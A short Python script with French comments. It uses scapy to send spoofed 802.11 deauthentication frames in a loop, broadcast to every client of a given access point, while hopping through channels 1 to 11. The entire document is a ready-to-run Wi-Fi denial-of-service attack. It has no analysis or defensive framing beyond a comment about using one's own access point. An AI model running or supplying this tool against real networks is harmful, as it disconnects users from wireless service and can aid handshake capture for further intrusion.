import os
import time
from scapy.all import *

# Définir l'interface à utiliser (e.g. wlan0, wlan1, etc.)
interface = "wlan1"

# Définir le canal à utiliser (e.g. 1, 6, 11, etc.)
channel = 1

# Adresse MAC du point d'accès (AP)
ap_address = "08:36:C9:98:11:A9"  # Remplacez par l'adresse MAC de votre AP

# Créer le paquet de désauthentification
packet = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address)/Dot11Deauth(reason=7)

while True:
    # Changer le canal
    os.system(f"iwconfig {interface} channel {channel}")

    # Envoyer le paquet
    sendp(packet, iface=interface, verbose=0)

    # Attendre 1 seconde
    time.sleep(1)

    # Incrémenter le canal
    channel = (channel % 11) + 1
